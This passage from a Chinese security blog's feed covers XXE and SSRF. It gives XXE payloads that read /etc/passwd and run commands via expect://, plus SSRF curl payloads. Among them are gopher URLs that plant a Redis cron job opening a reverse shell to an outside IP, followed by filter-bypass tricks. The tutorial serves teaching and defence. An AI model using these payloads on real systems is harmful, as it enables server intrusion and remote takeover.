class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。&lt;/p&gt;
&lt;h2 id=&#34;文件读取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件读取&#34;&gt;#&lt;/a&gt; 文件读取&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;(#ANY)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token entity named-entity&#34; title=&#34;&amp;file;&#34;&gt;&amp;amp;file;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://publicServer.com/&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;(#ANY)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;4&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;rce&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; RCE&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;GVI&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt; &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;foo&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;ANY&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;!ENTITY xxe SYSTEM &#34;expect://id&#34; &gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;catalog&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;core&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;test101&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;description&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token entity named-entity&#34; title=&#34;&amp;xxe;&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;description&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;core&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;catalog&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;xinclude&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xinclude&#34;&gt;#&lt;/a&gt; XInclude&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#39;1.0&#39;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;xmlns:&lt;/span&gt;xi&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://www.w3.org/2001/XInclude&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token namespace&#34;&gt;xi:&lt;/span&gt;include&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://publicServer.com/file.xml&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;token namespace&#34;&gt;xi:&lt;/span&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy53M3NjaG9vbC5jb20uY24veG1sLw==&#34;&gt;XML 教程&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWN1cml0eS50ZW5jZW50LmNvbS9pbmRleC5waHAvYmxvZy9tc2cvNjk=&#34;&gt;未知攻焉知防 XXE 漏洞攻防&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvOTc4MzMuaHRtbA==&#34;&gt;XXE 攻击笔记分享&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjg4Nw==&#34;&gt;从 XML 相关一步一步到 XXE 漏洞&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/</guid>
            <title>SSRF</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>SSRF</category>
            <pubDate>Sat, 26 Nov 2022 16:59:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。&lt;/p&gt;
&lt;h2 id=&#34;漏洞危害&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞危害&#34;&gt;#&lt;/a&gt; 漏洞危害&lt;/h2&gt;
&lt;p&gt;SSRF 可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用 File 协议读取本地文件。&lt;/p&gt;
&lt;p&gt;内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在 SSRF 时，通常会造成较大的危害。&lt;/p&gt;
&lt;h1 id=&#34;利用方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用方式&#34;&gt;#&lt;/a&gt; 利用方式&lt;/h1&gt;
&lt;p&gt;SSRF 利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。&lt;/p&gt;
&lt;p&gt;以 curl 为例，可以使用 dict 协议操作 Redis、file 协议读文件、gopher 协议反弹 Shell 等功能，常见的 Payload 如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -vvv &#39;dict://127.0.0.1:6379/info&#39;

curl -vvv &#39;file:///etc/passwd&#39;

# * 注意: 链接使用单引号，避免$变量问题

curl -vvv &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/103.21.140.84/6789 0&amp;gt;&amp;amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;相关危险函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关危险函数&#34;&gt;#&lt;/a&gt; 相关危险函数&lt;/h1&gt;
&lt;p&gt;SSRF 涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以 PHP 为例，涉及到的函数有  &lt;code&gt;file_get_contents()&lt;/code&gt;  /  &lt;code&gt;fsockopen()&lt;/code&gt;  /  &lt;code&gt;curl_exec()&lt;/code&gt;  等。&lt;/p&gt;
&lt;h1 id=&#34;过滤绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过滤绕过&#34;&gt;#&lt;/a&gt; 过滤绕过&lt;/h1&gt;
&lt;h2 id=&#34;更改ip地址写法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更改ip地址写法&#34;&gt;#&lt;/a&gt; 更改 IP 地址写法&lt;/h2&gt;
&lt;p&gt;一些开发者会通过对传过来的 URL 参数进行正则匹配的方式来过滤掉内网 IP，如采用如下正则表达式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;3&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;2&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;2&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于这种过滤我们采用改编 IP 的写法的方式进行绕过，例如 192.168.0.1 这个 IP 地址可以被改写成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;8 进制格式：0300.0250.0.1&lt;/li&gt;
&lt;li&gt;16 进制格式：0xC0.0xA8.0.1&lt;/li&gt;
&lt;li&gt;10 进制整数格式：3232235521&lt;/li&gt;
&lt;li&gt;16 进制整数格式：0xC0A80001&lt;/li&gt;
&lt;li&gt;合并后两位：1.1.278 / 1.1.755&lt;/li&gt;
&lt;li&gt;合并后三位：1.278 / 1.755 / 3.14159267&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外 IP 中的每一位，各个进制可以混用。&lt;/p&gt;
&lt;p&gt;访问改写后的 IP 地址时，Apache 会报 400 Bad Request，但 Nginx、MySQL 等其他服务仍能正常工作。&lt;/p&gt;
&lt;p&gt;另外，0.0.0.0 这个 IP 可以直接访问到本地，也通常被正则过滤遗漏。&lt;/p&gt;
&lt;h2 id=&#34;使用解析到内网的域名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用解析到内网的域名&#34;&gt;#&lt;/a&gt; 使用解析到内网的域名&lt;/h2&gt;
&lt;p&gt;如果服务端没有先解析 IP 再过滤内网地址，我们就可以使用 localhost 等解析到内网的域名。&lt;/p&gt;
&lt;p&gt;另外  &lt;code&gt;xip.io&lt;/code&gt;  提供了一个方便的服务，这个网站的子域名会解析到对应的 IP，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS0xOTItdWMwZXA5NmIuMTY4LjAuMS54aXAuaW8=&#34;&gt;例如 192.168.0.1.xip.io&lt;/span&gt;，解析到 192.168.0.1。&lt;/p&gt;
&lt;h2 id=&#34;利用解析url所出现的问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用解析url所出现的问题&#34;&gt;#&lt;/a&gt; 利用解析 URL 所出现的问题&lt;/h2&gt;
&lt;p&gt;在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。&lt;/p&gt;
&lt;p&gt;比如  &lt;code&gt;http://www.baidu.com@192.168.0.1/&lt;/code&gt;  当后端程序通过不正确的正则表达式（比如将 http 之后到 com 为止的字符内容，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS13d3cta2Q5ZHc1NGRzOW4uYmFpZHUuY29t&#34;&gt;也就是 www.baidu.com&lt;/span&gt;，认为是访问请求的 host 地址时）对上述 URL 的内容进行解析的时候，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1VUkxob3N0d3d3LXh4MnBoYTcxMGExdHpvNjRiZ2R6YWM5OGN3bnlib2s0YnFwYTY5N28uYmFpZHUuY29t&#34;&gt;很有可能会认为访问 URL 的 host 为 www.baidu.com&lt;/span&gt;，而实际上这个 URL 所请求的内容都是 192.168.0.1 上的内容。&lt;/p&gt;
&lt;h2 id=&#34;利用跳转&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用跳转&#34;&gt;#&lt;/a&gt; 利用跳转&lt;/h2&gt;
&lt;p&gt;如果后端服务器在接收到参数后，正确的解析了 URL 的 host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。&lt;/p&gt;
&lt;p&gt;可以使用如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2h0dHBiaW4ub3JnL3JlZGlyZWN0LXRvP3VybD1odHRwOi8vMTkyLjE2OC4wLjE=&#34;&gt;http://httpbin.org/redirect-to?url=http://192.168.0.1&lt;/span&gt; 等服务跳转，但是由于 URL 中包含了 192.168.0.1 这种内网 IP 地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。&lt;/p&gt;
&lt;p&gt;常用的跳转有 302 跳转和 307 跳转，区别在于 307 跳转会转发 POST 请求中的数据等，但是 302 跳转不会。&lt;/p&gt;
&lt;h2 id=&#34;通过各种非http协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过各种非http协议&#34;&gt;#&lt;/a&gt; 通过各种非 HTTP 协议&lt;/h2&gt;
&lt;p&gt;如果服务器端程序对访问 URL 所采用的协议进行验证的话，可以通过非 HTTP 协议来进行利用。&lt;/p&gt;
&lt;p&gt;比如通过 gopher，可以在一个 url 参数中构造 POST 或者 GET 请求，从而达到攻击内网应用的目的。例如可以使用 gopher 协议对与内网的 Redis 服务进行攻击，可以使用如下的 URL：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &amp;gt;&amp;amp; /dev/tcp/172.19.23.228/23330&amp;gt;&amp;amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;除了 gopher 协议，File 协议也是 SSRF 中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似  &lt;code&gt;file:///path/to/file&lt;/code&gt;  这种格式来访问计算机本地文件。使用 file 协议可以避免服务端程序对于所访问的 IP 进行的过滤。例如我们可以通过  &lt;code&gt;file:///d:/1.txt&lt;/code&gt;  来访问 D 盘中 1.txt 的内容。&lt;/p&gt;
&lt;h2 id=&#34;dns-rebinding&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-rebinding&#34;&gt;#&lt;/a&gt; DNS Rebinding&lt;/h2&gt;
&lt;p&gt;一个常用的防护思路是：对于用户请求的 URL 参数，首先服务器端会对其进行 DNS 解析，然后对于 DNS 服务器返回的 IP 地址进行判断，如果在黑名单中，就禁止该次请求。&lt;/p&gt;
&lt;p&gt;但是在整个过程中，第一次去请求 DNS 服务进行域名解析到第二次服务端去请求 URL 之间存在一个时间差，利用这个时间差，可以进行 DNS 重绑定攻击。&lt;/p&gt;
&lt;p&gt;要完成 DNS 重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的 DNS Server，在我们的可控的 DNS Server 上编写解析服务，设置 TTL 时间为 0。这样就可以进行攻击了，完整的攻击流程为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器端获得 URL 参数，进行第一次 DNS 解析，获得了一个非内网的 IP&lt;/li&gt;
&lt;li&gt;对于获得的 IP 进行判断，发现为非黑名单 IP，则通过验证&lt;/li&gt;
&lt;li&gt;服务器端对于 URL 进行访问，由于 DNS 服务器设置的 TTL 为 0，所以再次进行 DNS 解析，这一次 DNS 服务器返回的是内网地址。&lt;/li&gt;
&lt;li&gt;由于已经绕过验证，所以服务器端返回访问内网资源的结果。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;利用ipv6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用ipv6&#34;&gt;#&lt;/a&gt; 利用 IPv6&lt;/h2&gt;
&lt;p&gt;有些服务没有考虑 IPv6 的情况，但是内网又支持 IPv6，则可以使用 IPv6 的本地 IP 如  &lt;code&gt;[::]&lt;/code&gt;   &lt;code&gt;0000::1&lt;/code&gt;  或 IPv6 的内网域名来绕过过滤。&lt;/p&gt;
&lt;h2 id=&#34;利用idn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用idn&#34;&gt;#&lt;/a&gt; 利用 IDN&lt;/h2&gt;
&lt;p&gt;一些网络访问工具如 Curl 等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。&lt;/p&gt;
&lt;p&gt;在这些字符中，部分字符会在访问时做一个等价转换，例如  &lt;code&gt;ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ&lt;/code&gt;  和  &lt;code&gt;example.com&lt;/code&gt;  等同。利用这种方式，可以用  &lt;code&gt;① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩&lt;/code&gt;  等字符绕过内网限制。&lt;/p&gt;
